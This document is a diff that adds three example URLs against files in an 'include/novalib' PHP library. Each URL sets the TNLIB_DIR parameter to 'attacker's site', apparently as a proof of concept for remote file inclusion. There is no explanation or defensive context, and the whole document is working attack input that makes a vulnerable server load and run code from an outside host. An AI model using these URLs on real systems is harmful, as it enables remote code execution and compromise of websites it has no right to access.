@@ -1,0 +1,5 @@
+http://www.example.com/include/novalib/class.novaEdit.mysql.php?TNLIB_DIR=attacker's site
+
+http://www.example.com/include/novalib/class.novaAdmin.mysql.php?TNLIB_DIR=attacker's site
+
+http://www.example.com/include/novalib/class.novaRead.mysql.php?TNLIB_DIR=attacker's site
